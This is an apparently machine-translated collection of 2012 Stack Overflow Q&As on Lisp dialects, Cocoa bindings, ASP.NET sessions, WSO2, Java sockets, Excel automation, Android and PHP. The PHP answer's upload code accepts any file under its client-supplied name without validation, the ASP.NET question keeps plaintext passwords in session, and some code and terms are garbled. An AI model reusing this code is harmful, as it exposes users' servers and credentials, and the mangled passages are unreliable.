                /* (3) $.get('@Url.Content("~/Content/MyAudio")', {"name": "hello.mp3"}, 
                function(data) {
                alert("hello");
                });
                */
                audio.load();
                audio.play();
            }
        }
    </script> 
```

(1) 和 (2) 都有同样的问题。但是当我使用 (3) 时，HttpContext.User.Identity.isAuthenticated 在 Safary 中返回 true。但我猜你不能通过 jquery 提供文件流。

有没有人知道发生了什么以及如何解决问题？

PS 我使用 ASP.NET 开发服务器和 Safari 5.1.7 Win32 7。

# clojure - 学习一种 Lisp 是否有助于学习另一种？

> ID：11243936
> 
> 赞同：9
> 
> 时间：2012-06-28T11:46:48.907
> 
> 标签：clojure, lisp, scheme, elisp, common-lisp

学习不同的 Lisp 语言之间有什么协同作用吗？我目前正在学习 Emacs Lisp，因为它在我的日常 Emacs 使用中非常有用，但是我对所有 Lisp 都很着迷，所以也许有一天我会学习和使用其他的。**当我开始研究 Common Lisp、Scheme 或 Clojure 时，学习 Emacs Lisp 会对我有帮助吗？**换句话说，这对我来说会像学习一门全新的语言，还是某些概念和范式很常见？我也对比较 Lisp 之间的独特差异感兴趣，当我从一个 Lisp 到另一个 Lisp 时，这将是一个问题。

在[如何开始学习 Common Lisp 和 Emacs Lisp？](https://stackoverflow.com/q/3840443/596361)提到会有“浪费”，但没有详细说明，具体到什么程度。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-06-28T12:00:34.677

如果你想学习一些较早的 Lisp 基础知识，那么 Emacs Lisp 就可以了。

*   Emacs Lisp：可以在 Emacs 中使用。包括开发环境。主流 Lisp 的旧方言。缺乏很多概念。有许多编辑器编程的扩展。Common Lisp 和 Emacs Lisp 共享一些直接的遗产（命名、概念、...）。

*   常见的 Lisp。很多好书值得学习。许多 Lisp 概念（包括 OO 编程）可以通过 Common Lisp 学习。强烈推荐。Common Lisp 内置了最重要的 Lisp 工具，其余部分由库提供。有很多东西可以围绕它学习。

*   Scheme：70 年代创建的不同 Lisp 方言。与 Emacs Lisp 或 Common Lisp 不直接兼容。许多优秀的书籍和其他教程材料。强烈推荐用于学习 Lisp 基础知识和一些更高级的东西。对 Scheme 的研究越深入，它看起来与 Emacs Lisp 甚至 Common Lisp 的区别就越大。

*   Clojure：非常不同的 Lisp 方言。与 Common Lisp、Emacs Lisp 或 Scheme 不兼容。共享一些概念，一些概念的工作方式不同。好书。如果您想学习一些 Lisp 或特别是 Clojure，建议您使用。Clojure 强调函数式和并发编程——非常相关的主题。

**如果你想学习更多主流的 Lisp（一种具有典型 Lisp 方言外观和感觉的 Lisp），我会推荐 Common Lisp 或 Scheme。**

我对学习 Lisp (!) 的语言偏好是：

1.  通用 Lisp
2.  方案
3.  Clojure
4.  Emacs Lisp

给你举个例子：

这是**McCarthy 的 Lisp**`COLLAPSE`中的函数，写于 1960 年（来自[Lisp I Programmer's manual，1960](http://www.softwarepreservation.org/projects/LISP/book/LISP%20I%20Programmers%20Manual.pdf)，第 101 页）。它基本上是许多 Lisp 练习中的功能。它接受一个嵌套列表并返回一个新列表，其中包含单个列表中的原子。**`FLATTEN`**

 **```
DEFINE
(((COLLAPSE,(LAMBDA,(L),(COND,
   ((ATOM,L),(CONS,L,NIL))
  ((NULL,(CDR,L)),
     (COND,((ATOM,(CAR,L)),L),(T,(COLLAPSE,(CAR,L)))))
   (T,(APPEND,(COLLAPSE,(CAR,L)),(COLLAPSE,(CDR,L)))))
)))))) 
```

这是**Common Lisp**版本。您可以将其保留为大写或将其转换为小写。两者都有效。

```
(DEFUN COLLAPSE (L)
  (COND 
   ((ATOM L) (CONS L NIL))
   ((NULL (CDR L))
    (COND ((ATOM (CAR L)) L)
          (T (COLLAPSE (CAR L)))))
   (T (APPEND (COLLAPSE (CAR L))
              (COLLAPSE (CDR L)))))) 
```

基本上是一样的。只有定义函数的形式有不同的名称和语法。否则代码完全相同。

**在Common Lisp**中尝试 McCarthy 的示例：

```
CL-USER > (COLLAPSE '(((A B) ((C))) ((D (E F)) (G) ((H)))))
(A B C D E F G H) 
```

它运行。

现在让我们使用 GNU Emacs在**Emacs Lisp中尝试一下。**Emacs Lisp 有小写的标识符：

```
ELISP> (defun collapse (l)
         (cond 
           ((atom l) (cons l nil))
           ((null (cdr l))
            (cond ((atom (car l)) l)
                  (t (collapse (car l)))))
           (t (append (collapse (car l))
                      (collapse (cdr l))))))

ELISP> (collapse '(((a b) ((c))) ((d (e f)) (g) ((h)))))
(a b c d e f g h) 
```

它无需更改即可在**Emacs Lisp中运行。**

您可以在**Scheme**中获得类似的版本（少量重命名）：。

在*Petite Chez 计划*中：

```
> (define collapse
    (lambda (l)
      (cond 
        ((atom? l) (cons l '()))
        ((null? (cdr l))
         (cond ((atom? (car l)) l)
               (else (collapse (car l)))))
        (else (append (collapse (car l))
                      (collapse (cdr l))))))) 
```

我们可以用它`DEFINE`来定义一个函数。`COND`看起来略有不同。`()`是空列表。谓词有一个`?`添加。

```
> (collapse '(((a b) ((c))) ((d (e f)) (g) ((h)))))
(a b c d e f g h) 
```

运行。

在 Clojure 中，它看起来会有所不同。基本上你必须重新考虑很多代码。

这是 Clojure 自己的实现`flatten`：

```
(defn flatten
  [x]
  (filter (complement sequential?)
          (rest (tree-seq sequential? seq x)))) 
```

您可以`flatten`按照 Lisp 版本的精神编写一个 - 它看起来仍然会有所不同。

来自[rosetta.org](http://rosettacode.org/wiki/Flatten_a_list#Clojure)：

```
(defn flatten [coll]
  (lazy-seq
    (when-let [s  (seq coll)]
      (if (coll? (first s))
        (concat (flatten (first s)) (flatten (rest s)))
        (cons (first s) (flatten (rest s))))))) 
```

名称不同，语法不同，语义不同（适用于惰性序列而不是列表）。

Common Lisp、Emacs Lisp、Visual Lisp、ISLISP 等方言试图保留传统。

像 Scheme 或 Clojure 这样的方言感觉不受名称和语法的约束。他们在各个方向进行了创新。Scheme 仍然提供旧功能的直接版本。Clojure 没有。Clojure 程序员不会将此视为劣势。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-06-28T12:09:44.970

**是**的 - 如果你已经知道一个新的 Lisp，那么选择一个新的 Lisp 会容易得多。

原因：

*   您将理解“代码即数据”的概念和同音语言中的元编程（这可以说是使 Lisps 与其他语言独特/不同的最大单一因素）
*   You'll be able to read Lisp syntax much more easily. It takes a few weeks to get to the point where you "see" the structure of Lisp code, but after that point it gets much easier. You start to ignore the parentheses after a while.
*   The development style is similar, interacting with a running environment using a REPL
*   They share common idioms, e.g. the use of lists and various functional programming techniques**

# cocoa - Cocoa Bindings - 为什么我会得到这些字符？

> ID：11243944
> 
> 赞同：0
> 
> 时间：2012-06-28T11:47:39.893
> 
> 标签：cocoa, core-data, cocoa-bindings

我正在尝试学习 Cocoa 绑定，并有一个简单的应用程序，其中包含标题、名字和姓氏。

这是我运行应用程序时的结果截图：

![在此处输入图像描述](../Images/f95c08c303d51639663f6c9dc64f3c14.png)

我不明白为什么我在名字和姓氏中得到空字符串。

一切都是使用绑定构建的——没有代码。

绑定如下所示：

![在此处输入图像描述](../Images/06ec8a57cfcfe6663ccced2146fbb8b2.png)

任何帮助将不胜感激......谢谢！

编辑 - 这是名字的属性值：

![在此处输入图像描述](../Images/8fb5eddde16ba29f20b81d75de6aa5f1.png)

这是托管对象子类的代码...

```
@interface TestEntity : NSManagedObject

@property (nonatomic, retain) NSString * title;
@property (nonatomic, retain) NSString * firstname;
@property (nonatomic, retain) NSString * lastname;

@end

@implementation TestEntity

@dynamic title;
@dynamic firstname;
@dynamic lastname;

- (void) awakeFromInsert
{
    NSLog(@"%s", __FUNCTION__);

    NSString * baseValue = @" ";
    [self setValue: baseValue  forKey: @"firstname"];

} // awakeFromInsert 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T13:48:22.727

您将一个仅显示单个值的控件绑定到“arrangedObjects.yourKey”。这提供了一个集合。如果您在调试器控制台中使用 打印相同的内容`po someCollection`，您会看到相同的格式。

你想要“selection.yourKey”。这里“选择”的意思是“在数组控制器中选择了任何对象”，其余的键路径都植根于该对象。

您可能习惯于在表格视图中使用“arrangedObjects”，其中一列（本质上是垂直堆叠字段的数组需要一个排序的集合。这对于您的左侧表格（“主”视图）来说很好，但是您的右侧控件（“详细”视图）取决于其选择。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T13:19:59.373

在您的模型中，名字和姓氏可以为 null 并且没有默认值。取消`can be null`选中每个属性的复选框。

# c# - 在使用会话登录时记住我

> ID：11243946
> 
> 赞同：3
> 
> 时间：2012-06-28T11:47:45.960
> 
> 标签：c#, asp.net, session

我尝试通过会话记住我，但我无法成功。首先有可能吗？

在 CheckedChanged 方法中

```
 if (CheckBox1.Checked)
    {
        Session["email"] = TextBox1.Text;
        Session["pass"] = TextBox2.Text;

    } 
```

在页面加载方法中

```
 if (Session["email"].ToString() !=null && Session["pass"].ToString() !=null)
    {
       TextBox1.Text = Session["email"].ToString();
        TextBox2.Text = Session["pass"].ToString();
    } 
```

但它不起作用。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-28T11:50:49.357

您不能`Session`用于此目的。您应该使用`Cookie`来保存`Remember Me`状态。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:53:13.963

“记住我”功能是通过使用持久性 cookie 实现的。

您不能使用 Session 对象，因为它会在用户不活动一段时间后自动删除。

**安全注意事项**：**切勿**以明文格式存储用户密码！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:56:03.883

顺便说一句：最好创建一个具有两个属性`email`和的用户类`pass`，并将其存储在一个会话元素中：

```
User myUser = new User();
myUser.Email = "test@test.com";
myUser.Pass = "123456";

session["user"] = myUser; 
```

并且您将*记住我*存储在cookie 中，并使用一些高度加密或加盐散列的凭据，因此当您的用户再次访问时，您将名称和加盐散列与您在数据库中的信息相匹配

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-28T11:49:34.417

像这样改变。当您检查值时。当空对象存在时，您无法访问 ToString() 方法。

```
if (!string.IsNullOrEmpty(Session["email"]) && string.IsNullOrEmpty(Session["pass"])) )
 // then do with session objects. 
```

# wso2 - how to refer xsd file in registry in wsdl

> ID：11243948
> 
> 赞同：1
> 
> 时间：2012-06-28T11:47:53.920
> 
> 标签：wso2, wso2esb

I wish to r=read a xsd file available in registry in my WSDL (this is also in registry)

```
<xsd:schema targetNamespace="http://www.example.org/SearchMember/">
        <xsd:import namespace="http://www.memsrch.com/req"
            schemaLocation="**./MemberSearchReq.xsd**" />
        <xsd:import namespace="http://www.memsrch.com/resp"
            schemaLocation="**./MemberSearchRep.xsd**" />
    </xsd:schema> 
```

This is erroring as shown below

> Caused by: javax.wsdl.WSDLException: WSDLException (at /wsdl:definitions/wsdl:types/xsd:schema): faultCode=PARSER_ERROR: Problem parsing './MemberSearchRep.xsd'.: java.io.FileNotFoundException: C:\wso2esb-4.0.3\wso2esb-4.0.3\MemberSearchRep.xsd (The system cannot find the file specified) at com.ibm.wsdl.xml.WSDLReaderImpl.getDocument(WSDLReaderImpl.java:2166) at com.ibm.wsdl.xml.WSDLReaderImpl.parseSchema(WSDLReaderImpl.java:845) at com.ibm.wsdl.xml.WSDLReaderImpl.parseSchema(WSDLReaderImpl.java:669) at com.ibm.wsdl.xml.WSDLReaderImpl.parseTypes(WSDLReaderImpl.java:630) at com.ibm.wsdl.xml.WSDLReaderImpl.parseDefinitions(WSDLReaderImpl.java:342) at com.ibm.wsdl.xml.WSDLReaderImpl.readWSDL(WSDLReaderImpl.java:2320) at com.ibm.wsdl.xml.WSDLReaderImpl.readWSDL(WSDLReaderImpl.java:2284) at com.ibm.wsdl.xml.WSDLReaderImpl.readWSDL(WSDLReaderImpl.java:2337) at com.ibm.wsdl.xml.WSDLReaderImpl.readWSDL(WSDLReaderImpl.java:2358) at com.ibm.wsdl.xml.WSDLReaderImpl.readWSDL(WSDLReaderImpl.java:2390) at org.apache.axis2.description.WSDL11ToAxisServiceBuilder.readInTheWSDLFile(WSDL11ToAxisServiceBuilder.java:2318) at org.apache.axis2.description.WSDL11ToAxisServiceBuilder.setup(WSDL11ToAxisServiceBuilder.java:922) at org.apache.axis2.description.WSDL11ToAxisServiceBuilder.populateService(WSDL11ToAxisServiceBuilder.java:309) ... 22 more Caused by: java.io.FileNotFoundException: C:\wso2esb-4.0.3\wso2esb-4.0.3\MemberSearchRep.xsd (The system cannot find the file specified) at java.io.FileInputStream.open(Native Method) at java.io.FileInputStream.(FileInputStream.java:120) at java.io.FileInputStream.(FileInputStream.java:79) at sun.net.www.protocol.file.FileURLConnection.connect(FileURLConnection.java:70) at sun.net.www.protocol.file.FileURLConnection.getInputStream(FileURLConnection.java:161) at org.apache.xerces.impl.XMLEntityManager.setupCurrentEntity(Unknown Source) at org.apache.xerces.impl.XMLVersionDetector.determineDocVersion(Unknown Source) at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) at org.apache.xerces.parsers.DOMParser.parse(Unknown Source) at org.apache.xerces.jaxp.DocumentBuilderImpl.parse(Unknown Source) at com.ibm.wsdl.xml.WSDLReaderImpl.getDocument(WSDLReaderImpl.java:2156) ... 34 more

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-16T06:48:32.823

I'm not sure if you solved this, if not please refer to this blog post how to setup wsdl's in the registry that import XSD's: [http://madhukaudantha.blogspot.nl/2012/07/wso2-esb-proxy-from-registry.html](http://madhukaudantha.blogspot.nl/2012/07/wso2-esb-proxy-from-registry.html).

Regards, nidkil

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-29T01:58:52.593

Try removing the "./" and make sure the XSD is in the same resource collection in the registry as the WSDL. The name of the resource should be the same as the name used in schemaLocation.

One note of caution, ensure you do not nest XSD's as this is currently not supported by the registry.

Regard, nidkil

# java - 如何在 0.0.0.0 上接收广播包？

> ID：11243950
> 
> 赞同：2
> 
> 时间：2012-06-28T11:48:08.610
> 
> 标签：java, sockets, broadcast, dhcp, datagram

我的 Java 应用程序需要一些帮助。我需要在绑定到通配符地址的数据报套接字上接收广播数据包。最重要的是我的 wlan0 不应该有配置的 IP 地址，因为这个应用程序的目标是从服务器检索一个有效的 IP，一种 DHCP。
首先我在 0.0.0.0 上配置 wlan0。
此外，我将默认路由设置为通过 wlan0 接口（唯一的接口）。
如果配置输出是：

```
lo    Link encap:Local Loopback  
      inet addr:127.0.0.1  Mask:255.0.0.0
      inet6 addr: ::1/128 Scope:Host
      UP LOOPBACK RUNNING  MTU:16436  Metric:1
      RX packets:117 errors:0 dropped:0 overruns:0 frame:0
      TX packets:117 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0 
      RX bytes:9337 (9.3 KB)  TX bytes:9337 (9.3 KB)

wlan0     Link encap:Ethernet  HWaddr 00:1b:77:dd:e7:a4  
      inet6 addr: fe80::21b:77ff:fedd:e7a4/64 Scope:Link
      UP BROADCAST MULTICAST  MTU:1500  Metric:1
      RX packets:30211 errors:0 dropped:1 overruns:0 frame:0
      TX packets:6128 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000 
      RX bytes:16654450 (16.6 MB)  TX bytes:654646 (654.6 KB) 
```

这就是我在客户端上创建套接字的方式：

```
InetSocketAddress broadcast = new InetSocketAddress("0.0.0.0",listenPort);
socket = new DatagramSocket(null);
socket.setSoTimeout(5000);
socket.setBroadcast(true);
socket.bind(new InetSocketAddress(broadcast.getPort())); 
```

然后我将数据报包从客户端发送到 255.255.255.255。服务器（在同一子网上）接收它们并通过子网上的广播进行应答。客户端机器接收到服务器的广播数据包，但套接字没有，它在 socket.receive() 上阻塞自己；

有没有办法在绑定到未配置（无 IP）接口的套接字上接收数据报？

我尝试为 wlan0 提供 IP 并且一切正常，但我需要不配置 wlan0，只绑定到 0.0.0.0 通配符地址。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T06:11:46.217

在调用“setBroadcast”和“setSoTimeout”之前执行“绑定”调用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T13:26:24.607

当然，bind() 会引发 IOExceotion，因为套接字在构造时已经被绑定？

将 new DatagramSocket(null) 更改为 new DatagramSocket(broadcast); 删除 bind() 调用；并将 new InetSocketAddress() 的第一个参数从 '0.0.0.0' 更改为 null。

# python - 如何使用 Pythonwin32.com 加快 Excel 文件写入速度

> ID：11243955
> 
> 赞同：1
> 
> 时间：2012-06-28T11:48:19.913
> 
> 标签：python, numpy, win32com

我正在将 ascii 文件中的数据读取到数组中，并将数据写入 excel 文件以进行进一步的后处理。总共有 337 列和 1100 行——这使得 xlsx 中有 370700 个单元格。

写入 excel 数据文件需要很长时间——在 16 GB 机器上大约需要 25-35 分钟。

有没有其他方法可以更有效地在 excel 文件中写入数据？

任何帮助都将不胜感激。

```
import numpy as np 
import win32com.client as win32 
import matplotlib.pyplot as plt 
from win32com import client  from time
clock, time  start_time = clock()

itr = int(raw_input('Enter number of iteration = '))
f1 =open("Case_AT-6_WF_fl2.gid","r")

s2 = f1.read() 
a = s2.split() 

count=0 for col in open("Case_AT-6_WF_fl2.gid",'r'):
count = count+1 column = int(len(col.split()))
sm = int(itr * column)

digit = map(float,(a[(len(a)-sm):l
a[(column+7):(column*2+7)]

# preparing 2D matrix dig = np.array(digit)  dig1 =(dig.reshape

### *******Plotting
## print name

for i in range(len(name)):    
    print i,"=",name[i]

plot = int(raw_input("\nEnter variable number for plot =" ))

# writing Excel file*******************************************

print('file printing option: 1 = Yes 2= No') q = int(raw_input(
printing option = "))

if q==1 :
    excel = win32.gencache.EnsureDispatch('Excel.Application')
    excel.Visible = False
    wb = excel.Workbooks.Add()
    ws=wb.Sheets(1)
    ws.Name = "MyData"
    ws.Activate
    for kk in range(len(name)):
        ws.Cells(2,kk+1).Value = name[kk]
        ws.Cells(3,kk+1).Value = unit[kk]
m = 0
k =0
for j in range(itr):
    for k in range(column):
        ws.Cells(j+5,k+1).Value=dig1[j][k]
        m = m+1
       print '',m
print clock() - start_time, "seconds"

wb.SaveAs('C:\\Documents andSettings\\sd47086\\Desktop\\test\\MyWorkbook3.xlsx')
excel.Application.Quit() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T05:49:41.017

分配范围通常比单独设置每个单元格要快得多。您只需确保 python 序列与范围的大小匹配，例如 ws.Range('A1:B10000').Value = ('a','b') * 10000

# database - 收集 80 个用户的数据，隐藏其他用户的数据

> ID：11243956
> 
> 赞同：3
> 
> 时间：2012-06-28T11:48:23.097
> 
> 标签：database, forms, ms-office

我的妻子在一家中型零售连锁店工作。80家门店的经理每人（共900人）必须填写一行绩效信息，但不允许查看其他门店员工的数据。

我的妻子目前使用大量电子表格来管理这个，因为每个月主管都会更改他们想要收集的内容，而他们的 IT 团队没有资源来更新他们的 SAS 系统。她必须手动将所有数据编译到 1 个电子表格中进行分析，这既费时又容易出错。她最近从不得不为 20 家网点这样做到 80 家网点，并认为她必须是一种更简单的方法。

是否有一个简单的基于表单的系统，可以利用已安装的内容（microsoft office 和 lotus，但不是 MSAccess），或者可以从网络驱动器运行。云应用程序被禁止。Excel 的安全性全是错误的。Word 表单模板可以附加到共享数据源吗？有任何想法吗？

TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:11:51.020

您可以有一个包含所有数据的表，然后在此表上为每个单独的商店创建“影子表”。

在 MySQL 中，这可能是“分区表”（我从未使用过，所以不确定它是如何工作的）或临时表的使用。

然后，您需要实现一种方法，当用户在给定位置（IP 地址）登录时，触发器将创建临时表，然后使用该 IP 地址上的商店的相关数据填充它。

另一种选择（可能也更容易）是为每个商店设置一个指定的表，然后在您创建的每个表上授予用户特定的权限。同样，您需要触发器来在更新时使用信息填充单个“主表”，或者您只需发送一个 select * from outlet1, outlet2... outlet80

再次，您可能决定从上述选择创建一个临时表，并实施一个自定义脚本以仅在需要时创建它。事实上，我可能会这样做。然后在您的 Web 界面中有一个按钮来创建临时表，并将其显示给当前用户（当然，前提是他们具有查看所有表所需的权限）。

我不确定 Lotus 是否能够实现这一点，我不知道它的“数据库”解决方案。我知道在 Access 中做类似的事情并不难，唯一的缺点是需要处理用户标识（Access 本身不这样做），我也不知道 Lotus。

以我的经验，“平面文件数据库系统”通常不会以本机方式处理用户权限，而是将其放在接口开发中来处理。

我不确定答案有多大帮助，但它可能会带你一点解决方案（即使你最终选择服务器/客户端 dbms 系统）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-09T14:30:26.787

您可以为此使用 Lotus。一个简单的开始：

1.  创建一个表单和一个视图的数据库
2.  在表单上添加您想要的任何字段，但还添加一个“Readers”类型的计算时组合多值字段，其公式为：

    “[管理员]”：@Name（[CANONICALIZE]；@userName）

3.  除了具有管理员角色的人（例如，您的妻子）之外，视图将只向每个用户显示用户创建的记录。用户必须每行创建一条记录。

或者，您可以在数据库中创建一个代理，该代理从 Excel 文件中读取数据，并使用在创建文档时计算出的 READERS 字段值来构建文档（记录）。

如果这是您想在此处回复的路线，我将发布一些代码以 (i) 提示用户选择一个 excel 文件，(ii) 将 excel 文件数据读入 lotus notes，(iii) 实现一个 READERS字段以查看文档在创建者和管理员角色人员之间保密。

希望有帮助。

# windows-services - 用于监测服务发送的保活信号的服务

> ID：11243958
> 
> 赞同：1
> 
> 时间：2012-06-28T11:48:25.790
> 
> 标签：windows-services, monitoring

我有一个要监视的 Windows 服务。假设这个服务可能会突然失去它的互联网连接，而主机系统不知道。

如果我的服务在最后 X 分钟内没有“报告”，我需要一个可靠的在线监控服务，它允许我发送“我还活着”的信号，让他们给我发邮件。

我能找到的所有服务都是连接到我的网站/服务以查看它们是否正在运行的常规监控服务。我正在寻找一个允许我做相反事情的提供商。

这似乎是一项非常简单的服务，我无法理解为什么我在任何地方都找不到任何可用的东西？:\

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:51:42.240

你需要[newrelic](http://newrelic.com/)。

要么使用客户端，要么构建您自己的自定义工具。你可以做任何你喜欢的事情。

更新 ：

另一种选择是[scoutapp](https://www.scoutapp.com/)。可能具有相同的功能，但带有插件。

Fiveruns 是另一种选择，但我想它们不再营业了。

我可以理解这些功能对于您的简单场景来说听起来太多了，为什么不为您自己构建一些东西呢？您所需要的只是接受帖子并向您发送电子邮件的服务。

# java - 托管来自 droid 的私人 wifi 信号

> ID：11243960
> 
> 赞同：0
> 
> 时间：2012-06-28T11:48:36.877
> 
> 标签：java, android, wifi, p2p, personal-hotspot

我一直在尝试编写一个从 android 设备生成个人 WiFi 热点的应用程序，该应用程序通过主机的移动数据连接汇集网页和文件下载请求。我设法请求并下载了这些文件，但它们存储在手机下`sdcard\toSendOverWifi\`我创建的文件夹中。

已完成活动的快速列表：

1.  接收设备向主机发送网页/文件HTML地址请求
2.  主机通过 3g/4g/LTE 数据连接下载文件
3.  主机将文件保存到`sdcard\toSendOverWifi\`
4.  （未完成）主机将文件发送到接收设备（仅连接）

我还没有找到通过 WiFi 将下载的文件发送到其他设备的类和/或方法。

我需要什么类/方法来完成这个？它是否与无根设备兼容？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-15T17:12:22.367

您需要像往常一样使用 TCP/IP 套接字。

# android - ActionbarSherlock Fragment in Fragment

> ID：11243967
> 
> 赞同：0
> 
> 时间：2012-06-28T11:49:00.407
> 
> 标签：android, android-fragments, android-actionbar, actionbarsherlock

我不知道这是我的应用程序结构的问题还是我的代码的问题。

我有一个扩展 SherlockFragmentActivity 的 tabActivity。
这有一个 ViewPager 和一个 TabsAdapter。
有两个选项卡和一个选项菜单项（“搜索”）。
这两个选项卡用于输入搜索参数。一份简单，一份详细。如果单击搜索，则执行搜索并显示结果。

选项卡的内容已经是 SherlockFragment 类型的对象。到目前为止，这工作正常。

目前，搜索结果是一个单独的活动。我也希望将它们放在 viewpager 中。所以我将它转换为一个 SherlockActivity。但是，如果我在 onCreate() 方法中制作（“this”是 tabActivity）：

```
FragmentManager fm = this.getSupportFragmentManager();
Fragment ft = Fragment.instantiate(this, searchFragment.class.getName(), null);
if(fm.findFragmentById(R.id.searchresults_content) == null)
{
    fm.beginTransaction().add(R.id.searchresults_content, ft).commit();
} 
```

接着：

```
this.mViewPager.addView(ft.getView()); 
```

但`ft.getView();`返回空值。searchFragment 中的 OnCreateView 将执行此操作：

```
@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) 
{
    WebView mWebView = (WebView)findViewById(R.id.search_results);
    View mView = inflater.inflate(R.layout.search_results, container, false);
    mWebView.setWebViewClient(new SearchResultsWebViewClient());
//... (load data for webview etc...)
    return mView;
} 
```

search_results.xml：

```
 <?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="match_parent"
    android:layout_height="match_parent"> 
    <WebView xmlns:android="http://schemas.android.com/apk/res/android"
        android:id ="@+id/search_results"
        android:orientation="vertical"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >
    </WebView>
</LinearLayout> 
```

# asp.net - Process.start 在服务器上不起作用

> ID：11243970
> 
> 赞同：0
> 
> 时间：2012-06-28T11:49:17.500
> 
> 标签：asp.net, c#-4.0, itextsharp

我使用 itextsharp 创建了一个 PDF 文件。它已成功创建并使用 adobe reader 9 打开，而不是 adobe reader 7 和 8。请帮助我修复此错误。

这是我的部分代码：

```
 try
    {
        //yourFont = BaseFont.CreateFont(Application.StartupPath + "/verdana.TTF", BaseFont.WINANSI, BaseFont.EMBEDDED);
        pgSize = new iTextSharp.text.Rectangle(320, 455);

        doc = new Document(pgSize, 15, 5, 12, 4);
        fnt = new iTextSharp.text.Font(yourFont, 7, 3);
        fnt1 = new iTextSharp.text.Font(yourFont, 5, 0);
        fnt2 = new iTextSharp.text.Font(yourFont, 3, 2);
        fnt3 = new iTextSharp.text.Font(yourFont, 4, 6);

        PdfWriter.GetInstance(doc, new FileStream(Server.MapPath("Payslip.pdf"), FileMode.Create));
        //PdfWriter.GetInstance(doc, new FileStream(Server.MapPath("Payslip.pdf"), FileMode.Create)); //Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Payslip.pdf"

        doc.Open();
        DataView DView = (DataView)Session["data_value"];
        dtData = DView.ToTable();
        dr = dtData.Select("fldemp_no='" + Session["EmployeeID"].ToString() + "'");
        doc.NewPage();
        iTextSharp.text.Image ObjImg = iTextSharp.text.Image.GetInstance(Server.MapPath("~/Bin/Head.png"));
        ObjImg.Alignment = iTextSharp.text.Image.ALIGN_CENTER;
        ObjImg.ScaleToFit(220f, 150f);
        ObjImg.SpacingBefore = 13f;
        ObjImg.SpacingAfter = 1f;
        doc.Add(ObjImg);

        maintable = new PdfPTable(1);
        cell = new PdfPCell(new Phrase("Pay Slip for the month of " + dr[0]["fldmonth"].ToString(), fnt1));
        cell.HorizontalAlignment = Element.ALIGN_CENTER;
        cell.Border = 0;
        maintable.AddCell(cell);
        doc.Add(maintable);

        maintable = new PdfPTable(2);
        empdetright = new PdfPTable(2);

        empdetleft = new PdfPTable(2);
        cell = new PdfPCell(new Phrase("Emp No", fnt1));
        cell.Border = 0;
        empdetright.AddCell(cell);

        cell = new PdfPCell(new Phrase(": " + dr[0]["fldemp_no"].ToString(), fnt1));
        cell.Border = 0;
        empdetright.AddCell(cell);

        cell = new PdfPCell(new Phrase("Emp Name", fnt1));
        cell.Border = 0;
        empdetright.AddCell(cell);
        cell = new PdfPCell(new Phrase(": " + dr[0]["fldempname"].ToString(), fnt1));
        cell.Border = 0;
        empdetright.AddCell(cell);

        .......

         doc.Close();

        Process.Start(Server.MapPath("Payslip.pdf")); 
```

上面的代码在本地机器上运行，而不是在服务器上。请帮我解决这个错误..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:52:18.997

`Process.Start`将尝试在它正在运行的计算机（服务器）中打开文件。

这不太可能是您想要的。您应该将文件上传到浏览器并让它决定（`Response.WriteFile`例如使用 ）。

# php - 如何通过在线php文件获取文本文件数据。这在php中可能吗？

> ID：11243971
> 
> 赞同：1
> 
> 时间：2012-06-28T11:49:20.200
> 
> 标签：php, text-files

我有位于本地计算机上的文本文件。所以我在我的在线服务器上有另一个 php 文件。

所以我想通过我在线上传的 php 文件从位于我本地服务器的文本文件中获取数据。

这在 php.ini 中是否可行？如果是，那么 php 代码将是什么？我不知道该怎么做

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T12:34:30.627

对的，这是可能的。

您必须通过表单将文件从本地系统上传到带有表单输入字段的服务器，然后才能读取上传的文件。过程类似。（未测试）

您需要创建一个带有文件上传元素的表单。

```
<form action="upload_file.php" method="post" enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="uploadedfile" id="uploadedfile" />
<input type="submit" name="submit" value="Submit" />
</form> 
```

现在，您可以从此表单文件输入中上传本地文本文件。

上传的php代码如下：

```
$target_path = "uploads/";
$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    echo "The file ".  basename( $_FILES['uploadedfile']['name']). 
    " has been uploaded";
} else{
    echo "There was an error uploading the file, please try again!";
} 
```

而且您可以阅读以下文本文件：

```
$myFile = "filename_uploaded.txt";
$fh = fopen($myFile, 'r');
$theData = fread($fh, filesize($myFile));
fclose($fh);
echo $theData; 
```

# .htaccess - 在 XAMPP 中使用 .htaccess local 重写 URL

> ID：11243975
> 
> 赞同：1
> 
> 时间：2012-06-28T11:49:35.790
> 
> 标签：.htaccess, mod-rewrite, url-rewriting, xampp

我的 .htacces 以

```
 RewriteEngine on
   RewriteBase / 
```

